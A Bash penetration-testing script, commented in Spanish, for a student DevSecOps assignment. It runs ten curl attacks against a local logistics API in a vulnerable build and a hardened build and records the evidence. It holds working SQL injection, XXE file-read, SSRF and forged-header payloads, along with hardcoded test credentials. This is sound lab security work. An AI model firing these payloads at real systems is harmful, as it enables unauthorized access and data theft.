#!/usr/bin/env bash
# =============================================================================
# auditoria.sh — Script automatizado de pruebas de penetración (curl)
# Proyecto: TrackLog API — Grupo 5 (Logística)
# Evaluación 02 — DevSecOps
#
# Uso:
#   ./auditoria.sh vulnerable   -> corre los 10 ataques contra la API insegura
#                                  y guarda evidencia en auditoria/fase1/evidencia/
#   ./auditoria.sh seguro       -> corre los mismos 10 ataques contra la API
#                                  refactorizada y guarda evidencia en
#                                  auditoria/fase2/evidencia/
#
# El script asume que la API objetivo ya está corriendo en BASE_URL
# (ver variable abajo) y que, para el modo "seguro", se cuenta con un
# token válido (login previo) para las rutas que lo requieren.
# =============================================================================

set -uo pipefail

MODE="${1:-vulnerable}"
BASE_URL="${BASE_URL:-http://localhost:4000}"

if [ "$MODE" = "vulnerable" ]; then
  OUT_DIR="$(dirname "$0")/fase1/evidencia"
elif [ "$MODE" = "seguro" ]; then
  OUT_DIR="$(dirname "$0")/fase2/evidencia"
else
  echo "Uso: $0 [vulnerable|seguro]"
  exit 1
fi

mkdir -p "$OUT_DIR"

TS="$(date -u +"%Y-%m-%dT%H:%M:%SZ")"

echo "============================================================"
echo " Auditoría TrackLog API — modo: $MODE"
echo " Objetivo: $BASE_URL"
echo " Fecha (UTC): $TS"
echo "============================================================"

run_test () {
  local id="$1"
  local title="$2"
  local file="$OUT_DIR/${id}.txt"
  shift 2

  {
    echo "### $id — $title"
    echo "### Fecha (UTC): $TS"
    echo "### Comando ejecutado:"
    echo "$*"
    echo "------------------------------------------------------------"
    echo "### Respuesta HTTP (headers + body):"
  } > "$file"

  # Ejecuta el comando curl pasado como argumentos, capturando código HTTP.
  eval "$@" >> "$file" 2>&1

  echo "------------------------------------------------------------" >> "$file"
  echo "[OK] Evidencia guardada en: $file"
}

# -----------------------------------------------------------------------------
# Si estamos en modo "seguro", primero obtenemos un token válido vía login
# legítimo, para usarlo en los endpoints que ahora exigen autenticación.
# -----------------------------------------------------------------------------
TOKEN=""
if [ "$MODE" = "seguro" ]; then
  LOGIN_RESP=$(curl -s -X POST "$BASE_URL/api/driver/login" \
    -H "Content-Type: application/json" \
    --data '{"username":"cfuentes","password":"camion2024"}')
  TOKEN=$(echo "$LOGIN_RESP" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('token',''))" 2>/dev/null || echo "")
  echo "Token obtenido (login legítimo cfuentes): ${TOKEN:0:20}..."
fi

AUTH_HEADER=""
if [ -n "$TOKEN" ]; then
  AUTH_HEADER="-H 'Authorization: Bearer $TOKEN'"
fi

# -----------------------------------------------------------------------------
# A01 — Control de acceso roto: acceder a la ubicación de un conductor
# que NO es el autenticado (driver id=2) usando el token de otro (id=1),
# o sin ningún token en modo vulnerable.
# -----------------------------------------------------------------------------
run_test "A01_control_acceso" "Acceso no autorizado a ubicación GPS de otro conductor" \
  "curl -s -i $AUTH_HEADER '$BASE_URL/api/driver/location/2'"

# -----------------------------------------------------------------------------
# A02 — Fallas criptográficas: envío de credenciales por cabeceras en
# texto plano (en el modo vulnerable este endpoint existe; en el modo
# seguro, el login exige HTTPS simulado y rechaza credenciales por header).
# -----------------------------------------------------------------------------
run_test "A02_credenciales_texto_plano" "Envío de credenciales por headers sin cifrar" \
  "curl -s -i -X POST '$BASE_URL/api/driver/login' -H 'X-Username: cfuentes' -H 'X-Password: camion2024'"

# -----------------------------------------------------------------------------
# A03 — Inyección SQL en búsqueda de paquetes por código de barra.
# -----------------------------------------------------------------------------
PAYLOAD_SQLI=$(python3 -c "import urllib.parse; print(urllib.parse.quote(\"X' OR '1'='1\"))")
run_test "A03_inyeccion_sql" "Inyección SQL en /api/package/search (autenticado cuando aplica)" \
  "curl -s -i $AUTH_HEADER '$BASE_URL/api/package/search?barcode=$PAYLOAD_SQLI'"

# -----------------------------------------------------------------------------
# A04 — Condición de carrera: dos asignaciones concurrentes al mismo paquete.
# -----------------------------------------------------------------------------
{
  echo "### A04_condicion_carrera — Doble asignación concurrente del mismo paquete"
  echo "### Fecha (UTC): $TS"
  echo "### Comando ejecutado: dos POST /api/package/assign simultáneos sobre package_id=1"
  echo "------------------------------------------------------------"
  echo "### Respuesta 1:"
  eval "curl -s -i $AUTH_HEADER -X POST '$BASE_URL/api/package/assign' -H 'Content-Type: application/json' --data '{\"package_id\":1,\"driver_id\":1}'" &
  PID1=$!
  echo "### Respuesta 2:"
  eval "curl -s -i $AUTH_HEADER -X POST '$BASE_URL/api/package/assign' -H 'Content-Type: application/json' --data '{\"package_id\":1,\"driver_id\":2}'" &
  PID2=$!
  wait $PID1 $PID2
  echo "------------------------------------------------------------"
} > "$OUT_DIR/A04_condicion_carrera.txt" 2>&1
echo "[OK] Evidencia guardada en: $OUT_DIR/A04_condicion_carrera.txt"

# -----------------------------------------------------------------------------
# A05 — Panel de administración sin autenticación real.
# Se prueba: (1) sin ningún token, (2) con token válido pero de rol "driver"
# (no admin), para demostrar que el control de rol también se aplica.
# -----------------------------------------------------------------------------
run_test "A05_panel_admin_expuesto" "Acceso directo a /admin sin credenciales" \
  "curl -s -i '$BASE_URL/admin'"

if [ -n "$TOKEN" ]; then
  run_test "A05b_panel_admin_token_driver" "Acceso a /admin con token válido pero de rol driver (no admin)" \
    "curl -s -i $AUTH_HEADER '$BASE_URL/admin'"
fi

# -----------------------------------------------------------------------------
# A06 — Componentes vulnerables: se consulta el endpoint de versión que
# expone las dependencias usadas por la API.
# -----------------------------------------------------------------------------
run_test "A06_componentes_vulnerables" "Exposición de dependencias/versiones del backend" \
  "curl -s -i '$BASE_URL/api/version'"

# -----------------------------------------------------------------------------
# A07 — Autenticación rota: header estático falsificado.
# -----------------------------------------------------------------------------
run_test "A07_autenticacion_falsificada" "Autenticación con header estático falsificado (X-Driver-Auth)" \
  "curl -s -i -X POST '$BASE_URL/api/manifest/upload' -H 'X-Driver-Auth: true' -H 'Content-Type: application/xml' --data '<manifest><item>carga-test</item></manifest>'"

# -----------------------------------------------------------------------------
# A08 — XXE: lectura de archivo local del servidor vía entidad externa.
# Se repite el MISMO payload que en Fase 1, ahora incluyendo también un
# token válido (cuando existe), para demostrar que el bloqueo de XXE es
# un control independiente de la autenticación.
# -----------------------------------------------------------------------------
XXE_PAYLOAD='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><manifest><item>&xxe;</item></manifest>'
run_test "A08_xxe_lectura_archivo" "XXE — lectura de /etc/hostname vía entidad externa en manifiesto XML" \
  "curl -s -i -X POST '$BASE_URL/api/manifest/upload' $AUTH_HEADER -H 'X-Driver-Auth: true' -H 'Content-Type: application/xml' --data '$XXE_PAYLOAD'"

# -----------------------------------------------------------------------------
# A09 — Falta de logging: se verifica (fuera de banda) que no exista
# archivo de log de accesos. Este test documenta la AUSENCIA de evidencia,
# lo cual es en sí mismo el hallazgo.
# -----------------------------------------------------------------------------
if [ "$MODE" = "vulnerable" ]; then
  {
    echo "### A09_falta_logging — Verificación de ausencia de registro de eventos"
    echo "### Fecha (UTC): $TS"
    echo "### Se realizan 3 peticiones variadas y luego se verifica si existe"
    echo "### algún archivo de log generado por la aplicación."
    echo "------------------------------------------------------------"
    curl -s -o /dev/null -w "Petición 1 -> HTTP %{http_code}\n" "$BASE_URL/api/driver/location/1"
    curl -s -o /dev/null -w "Petición 2 -> HTTP %{http_code}\n" "$BASE_URL/admin"
    curl -s -o /dev/null -w "Petición 3 (ataque SQLi) -> HTTP %{http_code}\n" "$BASE_URL/api/package/search?barcode=%27%20OR%20%271%27%3D%271"
    echo "------------------------------------------------------------"
    echo "Resultado: la carpeta src/vulnerable/ NO contiene ninguna carpeta"
    echo "logs/ ni archivo de registro de aplicación. No hay middleware de"
    echo "logging (ver server.js). Los 3 intentos anteriores, incluido el"
    echo "ataque de inyección SQL, NO quedan registrados en ninguna parte."
  } > "$OUT_DIR/A09_falta_logging.txt" 2>&1
  echo "[OK] Evidencia guardada en: $OUT_DIR/A09_falta_logging.txt"
else
  LOG_PATH="$(dirname "$0")/../src/seguro/logs"
  {
    echo "### A09_logging_habilitado — Verificación de registro de eventos (mitigado)"
    echo "### Fecha (UTC): $TS"
    echo "### Se realizan 3 peticiones variadas (incluido un intento de SQLi y"
    echo "### un acceso no autorizado) y luego se muestra el contenido real"
    echo "### de los archivos de log generados por el middleware morgan."
    echo "------------------------------------------------------------"
    eval "curl -s -o /dev/null -w 'Petición 1 (ubicación propia) -> HTTP %{http_code}\n' $AUTH_HEADER '$BASE_URL/api/driver/location/1'"
    eval "curl -s -o /dev/null -w 'Petición 2 (admin sin permiso) -> HTTP %{http_code}\n' $AUTH_HEADER '$BASE_URL/admin'"
    eval "curl -s -o /dev/null -w 'Petición 3 (intento SQLi) -> HTTP %{http_code}\n' $AUTH_HEADER '$BASE_URL/api/package/search?barcode=%27%20OR%20%271%27%3D%271'"
    echo "------------------------------------------------------------"
    echo "### Contenido de logs/access.log (últimas líneas):"
    tail -n 6 "$LOG_PATH/access.log" 2>/dev/null || echo "(no se encontró access.log en $LOG_PATH)"
    echo "### Contenido de logs/security.log (eventos de seguridad):"
    tail -n 10 "$LOG_PATH/security.log" 2>/dev/null || echo "(sin eventos de seguridad registrados aún)"
  } > "$OUT_DIR/A09_logging_habilitado.txt" 2>&1
  echo "[OK] Evidencia guardada en: $OUT_DIR/A09_logging_habilitado.txt"
fi

# -----------------------------------------------------------------------------
# A10 — SSRF: el backend hace una petición saliente a un recurso "interno"
# que nunca debería ser alcanzable desde una entrada externa.
# -----------------------------------------------------------------------------
run_test "A10_ssrf_recurso_interno" "SSRF — acceso a recurso interno vía /api/maps/geocode" \
  "curl -s -i -X POST '$BASE_URL/api/maps/geocode' $AUTH_HEADER -H 'Content-Type: application/json' --data '{\"url\":\"$BASE_URL/internal/fleet-secrets\"}'"

echo "============================================================"
echo " Auditoría completa. Evidencia guardada en: $OUT_DIR"
echo "============================================================"
